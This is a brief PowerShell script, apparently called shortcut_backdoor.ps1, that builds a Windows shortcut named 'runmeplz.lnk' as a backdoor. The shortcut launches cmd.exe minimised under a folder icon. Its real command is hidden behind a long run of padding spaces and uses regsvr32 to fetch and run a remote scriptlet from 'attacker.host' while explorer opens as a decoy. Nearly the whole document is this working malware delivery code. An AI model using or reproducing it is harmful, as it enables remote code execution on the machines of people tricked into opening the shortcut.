# test.txt:
# /c explorer.exe /e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D} | regsvr32.exe /u /s /i:http://attacker.host/scripts/calc.png scrobj.dll

$file = Get-Content "C:\Users\User\Desktop\backdoor\link\test.txt"
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\User\Desktop\backdoor\link\runmeplz.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,15"
$Shortcut.Arguments = '                                                                                                                                                                                                                                      '+ $file
$Shortcut.Save()

# powershell
# shortcut_backdoor.ps1